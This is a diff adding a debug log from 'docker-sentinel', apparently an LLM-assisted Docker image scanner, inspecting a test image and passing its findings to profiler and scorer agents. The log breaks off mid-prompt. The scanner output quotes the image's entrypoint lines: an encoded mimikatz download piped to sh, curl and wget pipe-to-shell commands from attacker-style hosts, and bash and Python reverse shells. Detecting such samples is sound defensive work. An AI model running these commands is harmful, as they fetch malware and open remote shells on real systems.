@@ -1,0 +1,270 @@
+2026-03-22 01:21:23,917 [INFO] docker_sentinel.cli: === docker-sentinel started ===
+2026-03-22 01:21:23,918 [INFO] docker_sentinel.cli: image_name=my-safe-image  model=claude-haiku-4-5-20251001  output_dir=.
+2026-03-22 01:21:23,918 [DEBUG] docker_sentinel.cli: sys.executable=C:\Users\Amit\Desktop\new-agent-v2\.venv\Scripts\python.exe  frozen=False
+2026-03-22 01:21:23,918 [DEBUG] docker_sentinel.cli: sys.path=['C:\\Users\\Amit\\Desktop\\new-agent-v2\\.venv\\Scripts\\docker-sentinel.exe', 'C:\\Python312\\python312.zip', 'C:\\Python312\\DLLs', 'C:\\Python312\\Lib', 'C:\\Python312', 'C:\\Users\\Amit\\Desktop\\new-agent-v2\\.venv', 'C:\\Users\\Amit\\Desktop\\new-agent-v2\\.venv\\Lib\\site-packages', 'C:\\Users\\Amit\\Desktop\\new-agent-v2\\.venv\\Lib\\site-packages\\win32', 'C:\\Users\\Amit\\Desktop\\new-agent-v2\\.venv\\Lib\\site-packages\\win32\\lib', 'C:\\Users\\Amit\\Desktop\\new-agent-v2\\.venv\\Lib\\site-packages\\Pythonwin', 'C:\\Users\\Amit\\Desktop\\new-agent-v2\\scripts']
+2026-03-22 01:21:23,919 [DEBUG] docker_sentinel.cli: load_dotenv() completed
+2026-03-22 01:21:23,919 [DEBUG] docker_sentinel.cli: DOCKER_SENTINEL_AI_KEY present (length=108)
+2026-03-22 01:21:23,919 [INFO] docker_sentinel.cli: Calling run_pipeline …
+2026-03-22 01:21:23,919 [DEBUG] asyncio: Using proactor: IocpProactor
+2026-03-22 01:21:23,923 [DEBUG] docker.utils.config: Trying paths: ['C:\\Users\\Amit\\.docker\\config.json', 'C:\\Users\\Amit\\.dockercfg']
+2026-03-22 01:21:23,924 [DEBUG] docker.utils.config: Found file at path: C:\Users\Amit\.docker\config.json
+2026-03-22 01:21:23,924 [DEBUG] docker.auth: Found 'auths' section
+2026-03-22 01:21:23,924 [DEBUG] docker.auth: Auth data for ghcr.io is absent. Client might be using a credentials store instead.
+2026-03-22 01:21:23,924 [DEBUG] docker.auth: Found 'credsStore' section
+2026-03-22 01:21:23,933 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /version HTTP/1.1" 200 None
+2026-03-22 01:21:23,937 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /v1.48/images/my-safe-image/json HTTP/1.1" 200 None
+2026-03-22 01:21:23,938 [INFO] docker_sentinel.runner: Step 2: check_docker_hub_status(my-safe-image)
+2026-03-22 01:21:23,938 [DEBUG] urllib3.connectionpool: Starting new HTTPS connection (1): hub.docker.com:443
+2026-03-22 01:21:24,488 [DEBUG] urllib3.connectionpool: https://hub.docker.com:443 "GET /v2/repositories/library/my-safe-image/ HTTP/1.1" 404 43
+2026-03-22 01:21:24,489 [INFO] docker_sentinel.runner: Step 2: extract_image_metadata(my-safe-image)
+2026-03-22 01:21:24,489 [DEBUG] docker.utils.config: Trying paths: ['C:\\Users\\Amit\\.docker\\config.json', 'C:\\Users\\Amit\\.dockercfg']
+2026-03-22 01:21:24,490 [DEBUG] docker.utils.config: Found file at path: C:\Users\Amit\.docker\config.json
+2026-03-22 01:21:24,490 [DEBUG] docker.auth: Found 'auths' section
+2026-03-22 01:21:24,490 [DEBUG] docker.auth: Auth data for ghcr.io is absent. Client might be using a credentials store instead.
+2026-03-22 01:21:24,490 [DEBUG] docker.auth: Found 'credsStore' section
+2026-03-22 01:21:24,498 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /version HTTP/1.1" 200 None
+2026-03-22 01:21:24,501 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /v1.48/images/my-safe-image/json HTTP/1.1" 200 None
+2026-03-22 01:21:24,502 [INFO] docker_sentinel.runner: Step 2: running image_profiler agent (model=claude-haiku-4-5-20251001)
+2026-03-22 01:21:24,502 [DEBUG] google_adk.google.adk.models.lite_llm: 
+LLM Request:
+-----------------------------------------------------------
+System Instruction:
+
+You are the Image Profiler agent for docker-sentinel, a Docker image
+security inspector.
+
+You have been given two pre-fetched JSON blobs in session state:
+  - {"is_official": false, "is_verified_publisher": false, "publisher": "library", "repository_url": "https://hub.docker.com/_/my-safe-image", "pull_count": 0, "error": "HTTP 404: Not Found"}   : result of check_docker_hub_status
+  - {"labels": {}, "env_vars": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"], "entrypoint": ["/entrypoint.sh"], "cmd": [], "exposed_ports": ["36512/tcp"], "layer_count": 4, "architecture": "amd64", "os": "linux", "created": "2026-03-21T23:20:21.983751227Z", "size_bytes": 13880523, "error": null}   : result of extract_image_metadata
+
+Populate every field of the output schema strictly from those two
+blobs. Do not invent any detail that is not present in the data.
+If a field is not available in the data use an empty string, empty
+list, or zero as appropriate for the field type.
+
+
+You are an agent. Your internal name is "image_profiler".
+-----------------------------------------------------------
+Contents:
+{"parts":[{"text":"Populate the ImageProfile from the provided hub_status and image_meta data."}],"role":"user"}
+-----------------------------------------------------------
+Functions:
+
+-----------------------------------------------------------
+
+2026-03-22 01:21:26,464 [INFO] docker_sentinel.runner: Step 2: profile=image_name='my-safe-image' is_official=False is_verified_publisher=False publisher='library' repository_url='https://hub.docker.com/_/my-safe-image' pull_count=0 labels=[] env_vars=['PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'] entrypoint=['/entrypoint.sh'] cmd=[] exposed_ports=['36512/tcp'] layer_count=4 architecture='amd64' os='linux' created='2026-03-21T23:20:21.983751227Z' size_bytes=13880523
+2026-03-22 01:21:26,467 [DEBUG] docker.utils.config: Trying paths: ['C:\\Users\\Amit\\.docker\\config.json', 'C:\\Users\\Amit\\.dockercfg']
+2026-03-22 01:21:26,467 [DEBUG] docker.utils.config: Trying paths: ['C:\\Users\\Amit\\.docker\\config.json', 'C:\\Users\\Amit\\.dockercfg']
+2026-03-22 01:21:26,467 [DEBUG] docker.utils.config: Found file at path: C:\Users\Amit\.docker\config.json
+2026-03-22 01:21:26,467 [DEBUG] docker.utils.config: Found file at path: C:\Users\Amit\.docker\config.json
+2026-03-22 01:21:26,467 [DEBUG] docker.auth: Found 'auths' section
+2026-03-22 01:21:26,467 [DEBUG] docker.auth: Auth data for ghcr.io is absent. Client might be using a credentials store instead.
+2026-03-22 01:21:26,467 [DEBUG] docker.utils.config: Trying paths: ['C:\\Users\\Amit\\.docker\\config.json', 'C:\\Users\\Amit\\.dockercfg']
+2026-03-22 01:21:26,467 [DEBUG] docker.auth: Found 'credsStore' section
+2026-03-22 01:21:26,467 [DEBUG] docker.auth: Found 'auths' section
+2026-03-22 01:21:26,467 [DEBUG] docker.utils.config: Trying paths: ['C:\\Users\\Amit\\.docker\\config.json', 'C:\\Users\\Amit\\.dockercfg']
+2026-03-22 01:21:26,467 [DEBUG] docker.utils.config: Found file at path: C:\Users\Amit\.docker\config.json
+2026-03-22 01:21:26,467 [DEBUG] docker.utils.config: Trying paths: ['C:\\Users\\Amit\\.docker\\config.json', 'C:\\Users\\Amit\\.dockercfg']
+2026-03-22 01:21:26,468 [DEBUG] docker.utils.config: Trying paths: ['C:\\Users\\Amit\\.docker\\config.json', 'C:\\Users\\Amit\\.dockercfg']
+2026-03-22 01:21:26,468 [DEBUG] docker.auth: Auth data for ghcr.io is absent. Client might be using a credentials store instead.
+2026-03-22 01:21:26,470 [DEBUG] docker.auth: Found 'credsStore' section
+2026-03-22 01:21:26,469 [DEBUG] docker.utils.config: Found file at path: C:\Users\Amit\.docker\config.json
+2026-03-22 01:21:26,469 [DEBUG] docker.utils.config: Found file at path: C:\Users\Amit\.docker\config.json
+2026-03-22 01:21:26,470 [DEBUG] docker.utils.config: Trying paths: ['C:\\Users\\Amit\\.docker\\config.json', 'C:\\Users\\Amit\\.dockercfg']
+2026-03-22 01:21:26,470 [DEBUG] docker.utils.config: Found file at path: C:\Users\Amit\.docker\config.json
+2026-03-22 01:21:26,471 [DEBUG] docker.utils.config: Found file at path: C:\Users\Amit\.docker\config.json
+2026-03-22 01:21:26,470 [DEBUG] docker.utils.config: Trying paths: ['C:\\Users\\Amit\\.docker\\config.json', 'C:\\Users\\Amit\\.dockercfg']
+2026-03-22 01:21:26,468 [DEBUG] docker.utils.config: Trying paths: ['C:\\Users\\Amit\\.docker\\config.json', 'C:\\Users\\Amit\\.dockercfg']
+2026-03-22 01:21:26,470 [DEBUG] docker.auth: Found 'auths' section
+2026-03-22 01:21:26,471 [DEBUG] docker.auth: Found 'auths' section
+2026-03-22 01:21:26,471 [DEBUG] docker.auth: Found 'auths' section
+2026-03-22 01:21:26,472 [DEBUG] docker.auth: Auth data for ghcr.io is absent. Client might be using a credentials store instead.
+2026-03-22 01:21:26,471 [DEBUG] docker.auth: Auth data for ghcr.io is absent. Client might be using a credentials store instead.
+2026-03-22 01:21:26,472 [DEBUG] docker.utils.config: Found file at path: C:\Users\Amit\.docker\config.json
+2026-03-22 01:21:26,472 [DEBUG] docker.auth: Auth data for ghcr.io is absent. Client might be using a credentials store instead.
+2026-03-22 01:21:26,472 [DEBUG] docker.auth: Found 'credsStore' section
+2026-03-22 01:21:26,472 [DEBUG] docker.auth: Found 'auths' section
+2026-03-22 01:21:26,473 [DEBUG] docker.auth: Auth data for ghcr.io is absent. Client might be using a credentials store instead.
+2026-03-22 01:21:26,473 [DEBUG] docker.auth: Found 'credsStore' section
+2026-03-22 01:21:26,472 [DEBUG] docker.auth: Found 'credsStore' section
+2026-03-22 01:21:26,472 [DEBUG] docker.auth: Found 'auths' section
+2026-03-22 01:21:26,476 [DEBUG] docker.auth: Auth data for ghcr.io is absent. Client might be using a credentials store instead.
+2026-03-22 01:21:26,476 [DEBUG] docker.auth: Found 'credsStore' section
+2026-03-22 01:21:26,473 [DEBUG] docker.auth: Found 'auths' section
+2026-03-22 01:21:26,476 [DEBUG] docker.auth: Auth data for ghcr.io is absent. Client might be using a credentials store instead.
+2026-03-22 01:21:26,476 [DEBUG] docker.auth: Found 'credsStore' section
+2026-03-22 01:21:26,471 [DEBUG] docker.utils.config: Found file at path: C:\Users\Amit\.docker\config.json
+2026-03-22 01:21:26,472 [DEBUG] docker.auth: Found 'credsStore' section
+2026-03-22 01:21:26,478 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /version HTTP/1.1" 200 None
+2026-03-22 01:21:26,478 [DEBUG] docker.auth: Found 'auths' section
+2026-03-22 01:21:26,478 [DEBUG] docker.auth: Auth data for ghcr.io is absent. Client might be using a credentials store instead.
+2026-03-22 01:21:26,478 [DEBUG] docker.auth: Found 'credsStore' section
+2026-03-22 01:21:26,483 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /version HTTP/1.1" 200 None
+2026-03-22 01:21:26,486 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /v1.48/images/my-safe-image/json HTTP/1.1" 200 None
+2026-03-22 01:21:26,487 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /version HTTP/1.1" 200 None
+2026-03-22 01:21:26,487 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /version HTTP/1.1" 200 None
+2026-03-22 01:21:26,491 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /v1.48/images/my-safe-image/json HTTP/1.1" 200 None
+2026-03-22 01:21:26,492 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /v1.48/images/my-safe-image/json HTTP/1.1" 200 None
+2026-03-22 01:21:26,538 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /v1.48/images/sha256:1ca83f5b1d65de5664eef63dea3e665d436471e9c40740679fcc2e15c15b8118/get HTTP/1.1" 200 None
+2026-03-22 01:21:26,554 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /v1.48/images/sha256:1ca83f5b1d65de5664eef63dea3e665d436471e9c40740679fcc2e15c15b8118/get HTTP/1.1" 200 None
+2026-03-22 01:21:27,482 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /version HTTP/1.1" 200 None
+2026-03-22 01:21:27,486 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /version HTTP/1.1" 200 None
+2026-03-22 01:21:27,488 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /v1.48/images/my-safe-image/json HTTP/1.1" 200 None
+2026-03-22 01:21:27,496 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /v1.48/images/my-safe-image/json HTTP/1.1" 200 None
+2026-03-22 01:21:27,499 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /v1.48/images/sha256:1ca83f5b1d65de5664eef63dea3e665d436471e9c40740679fcc2e15c15b8118/history HTTP/1.1" 200 None
+2026-03-22 01:21:27,546 [DEBUG] urllib3.connectionpool: http://localhost:None "POST /v1.48/containers/create HTTP/1.1" 201 None
+2026-03-22 01:21:27,549 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /v1.48/containers/bbbef2218583a36dcf110691b09b1031d0fb8bc91a3e4b57102817ba38ef3492/json HTTP/1.1" 200 None
+2026-03-22 01:21:27,735 [DEBUG] urllib3.connectionpool: http://localhost:None "POST /v1.48/containers/bbbef2218583a36dcf110691b09b1031d0fb8bc91a3e4b57102817ba38ef3492/start HTTP/1.1" 204 0
+2026-03-22 01:21:27,737 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /v1.48/containers/bbbef2218583a36dcf110691b09b1031d0fb8bc91a3e4b57102817ba38ef3492/logs?stderr=0&stdout=1&timestamps=0&follow=1&tail=all HTTP/1.1" 200 None
+2026-03-22 01:21:27,739 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /v1.48/containers/bbbef2218583a36dcf110691b09b1031d0fb8bc91a3e4b57102817ba38ef3492/json HTTP/1.1" 200 None
+2026-03-22 01:21:27,742 [DEBUG] urllib3.connectionpool: http://localhost:None "POST /v1.48/containers/bbbef2218583a36dcf110691b09b1031d0fb8bc91a3e4b57102817ba38ef3492/wait HTTP/1.1" 200 None
+2026-03-22 01:21:28,485 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /version HTTP/1.1" 200 None
+2026-03-22 01:21:28,487 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /version HTTP/1.1" 200 None
+2026-03-22 01:21:28,487 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /v1.48/images/my-safe-image/json HTTP/1.1" 200 None
+2026-03-22 01:21:28,489 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /v1.48/images/my-safe-image/json HTTP/1.1" 200 None
+2026-03-22 01:21:28,546 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /v1.48/images/sha256:1ca83f5b1d65de5664eef63dea3e665d436471e9c40740679fcc2e15c15b8118/get HTTP/1.1" 200 None
+2026-03-22 01:21:28,546 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /v1.48/images/sha256:1ca83f5b1d65de5664eef63dea3e665d436471e9c40740679fcc2e15c15b8118/get HTTP/1.1" 200 None
+2026-03-22 01:21:28,557 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /v1.48/images/sha256:1ca83f5b1d65de5664eef63dea3e665d436471e9c40740679fcc2e15c15b8118/get HTTP/1.1" 200 None
+2026-03-22 01:21:29,487 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /version HTTP/1.1" 200 None
+2026-03-22 01:21:29,491 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /v1.48/images/my-safe-image/json HTTP/1.1" 200 None
+2026-03-22 01:21:29,546 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /v1.48/images/sha256:1ca83f5b1d65de5664eef63dea3e665d436471e9c40740679fcc2e15c15b8118/get HTTP/1.1" 200 None
+2026-03-22 01:21:34,083 [DEBUG] urllib3.connectionpool: http://localhost:None "DELETE /v1.48/containers/bbbef2218583a36dcf110691b09b1031d0fb8bc91a3e4b57102817ba38ef3492?v=False&link=False&force=False HTTP/1.1" 204 0
+2026-03-22 01:21:34,084 [INFO] docker_sentinel.runner: Step 3: complete — trufflehog={'secrets': [], 'error': None} layer={'layer_findings': [], 'error': None} scripts={'script_findings': [{'file_path': '/entrypoint.sh', 'script_type': 'entrypoint', 'matches': [{'pattern': 'base64 decode', 'line_number': 3, 'line_snippet': '  echo "d2dldCBodHRwOi8vZXZpbC1jMi5leGFtcGxlLmNvbS9taW1pa2F0ei5leGUgLU8gL3RtcC8ubWsgJiYgY2htb2QgK3ggL3RtcC8ubWsgJiYgL3RtcC8ubWs=" | base64 -d | sh'}, {'pattern': 'long base64 blob', 'line_number': 3, 'line_snippet': '  echo "d2dldCBodHRwOi8vZXZpbC1jMi5leGFtcGxlLmNvbS9taW1pa2F0ei5leGUgLU8gL3RtcC8ubWsgJiYgY2htb2QgK3ggL3RtcC8ubWsgJiYgL3RtcC8ubWs=" | base64 -d | sh'}, {'pattern': 'base64 decode piped to command', 'line_number': 3, 'line_snippet': '  echo "d2dldCBodHRwOi8vZXZpbC1jMi5leGFtcGxlLmNvbS9taW1pa2F0ei5leGUgLU8gL3RtcC8ubWsgJiYgY2htb2QgK3ggL3RtcC8ubWsgJiYgL3RtcC8ubWs=" | base64 -d | sh'}, {'pattern': 'pipe-to-shell (curl)', 'line_number': 5, 'line_snippet': '  curl -fsSL http://evil-c2.example.com/stage2.sh | bash'}, {'pattern': 'pipe-to-shell (wget)', 'line_number': 7, 'line_snippet': '  wget -q -O - http://6.35.2.5/install.sh | sh'}, {'pattern': 'bash /dev/tcp reverse shell (stderr)', 'line_number': 9, 'line_snippet': '  bash -i >& /dev/tcp/203.0.113.42/4444 0>&1'}, {'pattern': 'raw /dev/tcp|udp channel', 'line_number': 9, 'line_snippet': '  bash -i >& /dev/tcp/203.0.113.42/4444 0>&1'}, {'pattern': 'Python socket+subprocess shell', 'line_number': 11, 'line_snippet': '  python3 -c "import socket,subprocess;s=socket.socket();s.connect((\'203.0.113.42\',4444));subprocess.call([\'/bin/sh\'],stdin=s,stdout=s,stderr=s)"'}, {'pattern': 'C2/dropper variable assignment', 'line_number': 14, 'line_snippet': '  C2_HOST="203.0.113.42:4444"'}, {'pattern': 'C2/dropper variable assignment', 'line_number': 16, 'line_snippet': '  DROPPER_URL="http://evil-c2.example.com/payloads/mimikatz.exe"'}, {'pattern': 'C2/dropper variable assignment', 'line_number': 17, 'line_snippet': '  STAGE2_URL="http://evil-c2.example.com/payloads/stage2.sh"'}]}], 'error': None} urls={'url_findings': [{'url': '127.0.0.1', 'source_file': '/etc/hosts', 'flags': ['raw IP address']}, {'url': 'http://6.35.2.5/install.sh', 'source_file': '/entrypoint.sh', 'flags': ['raw IP address', 'suspicious path keyword: install']}, {'url': 'http://evil-c2.example.com/payloads/mimikatz.exe', 'source_file': '/entrypoint.sh', 'flags': ['suspicious path keyword: payload']}, {'url': 'http://evil-c2.example.com/payloads/stage2.sh', 'source_file': '/entrypoint.sh', 'flags': ['suspicious path keyword: payload']}, {'url': '203.0.113.42', 'source_file': '/entrypoint.sh', 'flags': ['raw IP address']}], 'error': None} env={'env_findings': [], 'error': None} manifests={'manifest_findings': [], 'error': None} persistence={'persistence_findings': [{'file_path': '/var/spool/cron/crontabs', 'layer_index': 0, 'persistence_type': 'cron', 'evidence': 'File present in layer 0'}], 'error': None} history={'history_findings': [{'layer_index': 2, 'command_snippet': 'RUN /bin/sh -c chmod +x /entrypoint.sh # buildkit', 'pattern_matched': 'chmod +x on file'}], 'error': None} capabilities={'capability_findings': [{'finding_type': 'runs_as_root', 'evidence': "User=''", 'detail': 'Container runs as root by default'}], 'error': None}
+2026-03-22 01:21:34,084 [INFO] docker_sentinel.runner: Step 4: flagged_urls count=5
+2026-03-22 01:21:34,561 [INFO] docker_sentinel.runner: Step 4: url_verdicts=[{'url': 'http://6.35.2.5/install.sh', 'verdict': 'Safe', 'reason': 'IP not listed in Spamhaus ZEN'}, {'url': '203.0.113.42', 'verdict': 'Not Safe', 'reason': 'Spamhaus ZEN listed: 127.0.0.11'}]
+2026-03-22 01:21:34,561 [DEBUG] docker.utils.config: Trying paths: ['C:\\Users\\Amit\\.docker\\config.json', 'C:\\Users\\Amit\\.dockercfg']
+2026-03-22 01:21:34,561 [DEBUG] docker.utils.config: Found file at path: C:\Users\Amit\.docker\config.json
+2026-03-22 01:21:34,561 [DEBUG] docker.auth: Found 'auths' section
+2026-03-22 01:21:34,561 [DEBUG] docker.auth: Auth data for ghcr.io is absent. Client might be using a credentials store instead.
+2026-03-22 01:21:34,561 [DEBUG] docker.auth: Found 'credsStore' section
+2026-03-22 01:21:34,571 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /version HTTP/1.1" 200 None
+2026-03-22 01:21:34,574 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /v1.48/images/my-safe-image/json HTTP/1.1" 200 None
+2026-03-22 01:21:34,630 [DEBUG] urllib3.connectionpool: http://localhost:None "POST /v1.48/containers/create HTTP/1.1" 201 None
+2026-03-22 01:21:34,632 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /v1.48/containers/9f86f53820a80f2f10bd9552176fb0e54b96cbf3249abc366258cd1baca0b057/json HTTP/1.1" 200 None
+2026-03-22 01:21:34,725 [DEBUG] urllib3.connectionpool: http://localhost:None "POST /v1.48/containers/9f86f53820a80f2f10bd9552176fb0e54b96cbf3249abc366258cd1baca0b057/start HTTP/1.1" 204 0
+2026-03-22 01:21:34,729 [DEBUG] urllib3.connectionpool: http://localhost:None "POST /v1.48/containers/9f86f53820a80f2f10bd9552176fb0e54b96cbf3249abc366258cd1baca0b057/exec HTTP/1.1" 201 None
+2026-03-22 01:21:34,732 [DEBUG] urllib3.connectionpool: http://localhost:None "POST /v1.48/exec/cb1fc19b35b3cbef9b71e4787286be5ad908e30edb4a0a8bc420d0654e17fb3f/start HTTP/1.1" 101 0
+2026-03-22 01:21:34,748 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /v1.48/exec/cb1fc19b35b3cbef9b71e4787286be5ad908e30edb4a0a8bc420d0654e17fb3f/json HTTP/1.1" 200 None
+2026-03-22 01:21:34,752 [DEBUG] urllib3.connectionpool: http://localhost:None "POST /v1.48/containers/9f86f53820a80f2f10bd9552176fb0e54b96cbf3249abc366258cd1baca0b057/exec HTTP/1.1" 201 None
+2026-03-22 01:21:34,755 [DEBUG] urllib3.connectionpool: http://localhost:None "POST /v1.48/exec/bfe4fd97f2812a096b1676a5ea421c65a86551d9e0254f654f8736b559a111f1/start HTTP/1.1" 101 0
+2026-03-22 01:21:34,832 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /v1.48/exec/bfe4fd97f2812a096b1676a5ea421c65a86551d9e0254f654f8736b559a111f1/json HTTP/1.1" 200 None
+2026-03-22 01:21:34,836 [DEBUG] urllib3.connectionpool: http://localhost:None "POST /v1.48/containers/9f86f53820a80f2f10bd9552176fb0e54b96cbf3249abc366258cd1baca0b057/exec HTTP/1.1" 201 None
+2026-03-22 01:21:34,839 [DEBUG] urllib3.connectionpool: http://localhost:None "POST /v1.48/exec/81521d7165bf0988ed1e33a322acbecc02b6fcca418698624b61b7a95734f359/start HTTP/1.1" 101 0
+2026-03-22 01:21:34,854 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /v1.48/exec/81521d7165bf0988ed1e33a322acbecc02b6fcca418698624b61b7a95734f359/json HTTP/1.1" 200 None
+2026-03-22 01:21:34,858 [DEBUG] urllib3.connectionpool: http://localhost:None "POST /v1.48/containers/9f86f53820a80f2f10bd9552176fb0e54b96cbf3249abc366258cd1baca0b057/exec HTTP/1.1" 201 None
+2026-03-22 01:21:34,862 [DEBUG] urllib3.connectionpool: http://localhost:None "POST /v1.48/exec/69545e3a9f55145baf23a6943bc9d9eef8cca1d83232f4a52164560d99b3e79c/start HTTP/1.1" 101 0
+2026-03-22 01:21:34,878 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /v1.48/exec/69545e3a9f55145baf23a6943bc9d9eef8cca1d83232f4a52164560d99b3e79c/json HTTP/1.1" 200 None
+2026-03-22 01:21:34,882 [DEBUG] urllib3.connectionpool: http://localhost:None "POST /v1.48/containers/9f86f53820a80f2f10bd9552176fb0e54b96cbf3249abc366258cd1baca0b057/exec HTTP/1.1" 201 None
+2026-03-22 01:21:34,885 [DEBUG] urllib3.connectionpool: http://localhost:None "POST /v1.48/exec/7c97202df7bc5e9ac854bc26e5c4347f3c0efdab2333896bc5fc6f937f55af27/start HTTP/1.1" 101 0
+2026-03-22 01:21:34,902 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /v1.48/exec/7c97202df7bc5e9ac854bc26e5c4347f3c0efdab2333896bc5fc6f937f55af27/json HTTP/1.1" 200 None
+2026-03-22 01:21:34,906 [DEBUG] urllib3.connectionpool: http://localhost:None "POST /v1.48/containers/9f86f53820a80f2f10bd9552176fb0e54b96cbf3249abc366258cd1baca0b057/exec HTTP/1.1" 201 None
+2026-03-22 01:21:34,909 [DEBUG] urllib3.connectionpool: http://localhost:None "POST /v1.48/exec/86d5d20ea8441dd542a9de7fc79bd033410166fb70c427960bec59b4e606470f/start HTTP/1.1" 101 0
+2026-03-22 01:21:34,924 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /v1.48/exec/86d5d20ea8441dd542a9de7fc79bd033410166fb70c427960bec59b4e606470f/json HTTP/1.1" 200 None
+2026-03-22 01:21:34,928 [DEBUG] urllib3.connectionpool: http://localhost:None "POST /v1.48/containers/9f86f53820a80f2f10bd9552176fb0e54b96cbf3249abc366258cd1baca0b057/exec HTTP/1.1" 201 None
+2026-03-22 01:21:34,931 [DEBUG] urllib3.connectionpool: http://localhost:None "POST /v1.48/exec/c4540c904b186bb23d5db891084f99f5f6f33deb4b9f9c4ccd75e28251b986f9/start HTTP/1.1" 101 0
+2026-03-22 01:21:34,947 [DEBUG] urllib3.connectionpool: http://localhost:None "GET /v1.48/exec/c4540c904b186bb23d5db891084f99f5f6f33deb4b9f9c4ccd75e28251b986f9/json HTTP/1.1" 200 None
+2026-03-22 01:21:40,049 [DEBUG] urllib3.connectionpool: http://localhost:None "POST /v1.48/containers/9f86f53820a80f2f10bd9552176fb0e54b96cbf3249abc366258cd1baca0b057/stop?t=5 HTTP/1.1" 204 0
+2026-03-22 01:21:40,068 [DEBUG] urllib3.connectionpool: http://localhost:None "DELETE /v1.48/containers/9f86f53820a80f2f10bd9552176fb0e54b96cbf3249abc366258cd1baca0b057?v=False&link=False&force=True HTTP/1.1" 204 0
+2026-03-22 01:21:40,068 [INFO] docker_sentinel.runner: Step 5: dynamic={'container_id': '9f86f53820a80f2f10bd9552176fb0e54b96cbf3249abc366258cd1baca0b057', 'checks': [{'probe': 'running_processes', 'anomalies': []}, {'probe': 'suid_files', 'anomalies': []}, {'probe': 'environment_variables', 'anomalies': []}, {'probe': 'crontab', 'anomalies': []}, {'probe': 'listening_services', 'anomalies': []}, {'probe': 'sudoers', 'anomalies': []}, {'probe': 'active_services', 'anomalies': []}], 'error': None}
+2026-03-22 01:21:40,068 [INFO] docker_sentinel.runner: Filtered finding keys: ['scripts', 'persistence', 'history', 'capabilities', 'url_verdicts']
+2026-03-22 01:21:40,069 [INFO] docker_sentinel.runner: Step 6: running scorer agent
+2026-03-22 01:21:40,070 [DEBUG] google_adk.google.adk.models.lite_llm: 
+LLM Request:
+-----------------------------------------------------------
+System Instruction:
+
+You are the Scorer agent for docker-sentinel.
+
+Inputs: {"image_name": "my-safe-image", "is_official": false, "is_verified_publisher": false, "publisher": "library", "repository_url": "https://hub.docker.com/_/my-safe-image", "pull_count": 0, "labels": [], "env_vars": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"], "entrypoint": ["/entrypoint.sh"], "cmd": [], "exposed_ports": ["36512/tcp"], "layer_count": 4, "architecture": "amd64", "os": "linux", "created": "2026-03-21T23:20:21.983751227Z", "size_bytes": 13880523} (ImageProfile JSON) and {"scripts": [{"file_path": "/entrypoint.sh", "script_type": "entrypoint", "matches": [{"pattern": "base64 decode", "line_number": 3, "line_snippet": "  echo \"d2dldCBodHRwOi8vZXZpbC1jMi5leGFtcGxlLmNvbS9taW1pa2F0ei5leGUgLU8gL3RtcC8ubWsgJiYgY2htb2QgK3ggL3RtcC8ubWsgJiYgL3RtcC8ubWs=\" | base64 -d | sh"}, {"pattern": "long base64 blob", "line_number": 3, "line_snippet": "  echo \"d2dldCBodHRwOi8vZXZpbC1jMi5leGFtcGxlLmNvbS9taW1pa2F0ei5leGUgLU8gL3RtcC8ubWsgJiYgY2htb2QgK3ggL3RtcC8ubWsgJiYgL3RtcC8ubWs=\" | base64 -d | sh"}, {"pattern": "base64 decode piped to command", "line_number": 3, "line_snippet": "  echo \"d2dldCBodHRwOi8vZXZpbC1jMi5leGFtcGxlLmNvbS9taW1pa2F0ei5leGUgLU8gL3RtcC8ubWsgJiYgY2htb2QgK3ggL3RtcC8ubWsgJiYgL3RtcC8ubWs=\" | base64 -d | sh"}, {"pattern": "pipe-to-shell (curl)", "line_number": 5, "line_snippet": "  curl -fsSL http://evil-c2.example.com/stage2.sh | bash"}, {"pattern": "pipe-to-shell (wget)", "line_number": 7, "line_snippet": "  wget -q -O - http://6.35.2.5/install.sh | sh"}, {"pattern": "bash /dev/tcp reverse shell (stderr)", "line_number": 9, "line_snippet": "  bash -i >& /dev/tcp/203.0.113.42/4444 0>&1"}, {"pattern": "raw /dev/tcp|udp channel", "line_number": 9, "line_snippet": "  bash -i >& /dev/tcp/203.0.113.42/4444 0>&1"}, {"pattern": "Python socket+subprocess shell", "line_number": 11, "line_snippet": "  python3 -c \"import socket,subprocess;s=socket.socket();s.connect(('203.0.113.42',4444));subprocess.call(['/bin/sh'],stdin=s,stdout=s,stderr=s)\""}, {"pattern": "C2/dropper variable assignment", "line_number": 14, "line_snippet": "  